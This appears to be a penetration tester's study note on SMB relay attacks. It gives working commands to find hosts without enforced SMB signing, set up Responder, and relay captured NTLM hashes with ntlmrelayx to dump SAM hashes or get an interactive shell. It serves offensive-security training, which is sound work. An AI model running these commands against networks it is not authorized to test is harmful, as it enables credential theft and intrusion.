- Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines via SMB and potentially gain access.

### Requirements
- SMB Signing must be disabled or not enforced on the target.
	- SMB Signing is disabled by default on workstations, whereas it is enabled on servers.
- Relayed user credentials must be admin (local administrator) on machine for any real value.
- Credentials cannot be relayed to the same machine

### Identify hosts without SMB Signing enabled
- `nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24`
	- Ideally we are looking for "Message signing enabled but not required".

### Configuring Responder
- `sudo mousepad /etc/responder/Responder.conf`
- Make sure SMB and HTTP are set to "Off".
	- We do this to make sure that the hashes get relayed instead of just being captured.

### Running Responder
- `sudo responder -I tun0 -dPv`

### Setting up an SMB Relay
- Install ntlmrelayx via PimpMyKali
- `sudo ntlmrelayx.py -tf targets.txt -smb2support`
	- When an event occurs, the `ntlmrelayx` tool dumps the SAM hashes of the target machine, which we can use to log into the machine.
	- To get an interactive shell instead of the default behaviour (dumping SAM hashes), we can use the `-i` flag.
		- Connecting to the interactive shell can be done using netcat: `nc 127.0.0.1 11000`
	- To just execute a single command instead of getting an interactive shell we can use the `-c` flag, followed by the command in double quotes.